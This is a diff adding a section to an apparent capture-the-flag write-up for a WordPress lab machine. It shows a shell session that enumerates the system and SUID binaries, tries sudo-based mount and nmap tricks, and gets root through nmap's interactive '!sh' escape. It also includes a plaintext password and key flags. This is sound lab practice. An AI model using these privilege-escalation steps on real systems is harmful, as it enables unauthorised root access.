@@ -85,3 +85,113 @@ robot@linux:~$ cat key-2-of-3.txt
 cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 
+abcdefghijklmnopqrstuvwxyz
+
+6. information about kernel and user 'robot'
+
+robot@linux:/opt/bitnami/apps/wordpress/htdocs$ sudo -l
+Sorry, user robot may not run sudo on linux.
+
+robot@linux:/opt/bitnami/apps/wordpress/htdocs$ id
+id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+
+robot@linux:/opt/bitnami/apps/wordpress/htdocs$ umask
+umask
+0002
+
+robot@linux:/opt/bitnami/apps/wordpress/htdocs$ groups
+groups
+robot
+
+robot@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /etc/os-release 2>/dev/null
+                        
+NAME="Ubuntu"
+VERSION="14.04.2 LTS, Trusty Tahr"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 14.04.2 LTS"
+VERSION_ID="14.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+
+robot@linux:/opt/bitnami/apps/wordpress/htdocs$ cat /proc/version
+
+Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
+
+----------list of available functions--------------------
+robot@linux:/$ find /bin -perm -4000 -type f 2> /dev/null
+
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+
+robot@linux:/$ find /usr -perm -4000 -type f 2> /dev/null
+
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+
+7. Privilige Escalation 
+
+Attempt 1. We can execute 'mount' but nothing happened:
+
+robot@linux:/$ sudo mount -o bind /bin/sh /bin/mount
+sudo mount -o bind /bin/sh /bin/mount
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+robot is not in the sudoers file.  This incident will be reported.
+robot@linux:/$ sudo mount
+sudo mount
+[sudo] password for robot: abcdefghijklmnopqrstuvwxyz
+
+robot is not in the sudoers file.  This incident will be reported.
+
+Attempt 2. We can execute nmap:
+
+robot@linux:/$ TF=$(mktemp)
+robot@linux:/$ echo 'os.execute("/bin/sh")' > $TF
+robot@linux:/$ sudo nmap --script=$TF
+robot is not in the sudoers file.  This incident will be reported.
+
+robot@linux:/$ sudo nmap --interactive
+robot is not in the sudoers file.  This incident will be reported.
+
+Attempt 1 without sudo:
+robot@linux:/$ mount -o bind /bin/sh /bin/mount
+mount -o bind /bin/sh /bin/mount
+mount: only root can do that
+
+Attempt 2 without sudo:
+robot@linux:/$ nmap --script=$TF
+nmap --script=$TF
+nmap: unrecognized option '--script=/tmp/tmp.YOWMfsiDJH'
+
+!!!!!FINALLLYYY!!!!!!!
+
+robot@linux:/$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+!sh
+
+!!!!!YASSSS!!!!!!!!!!
+
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+
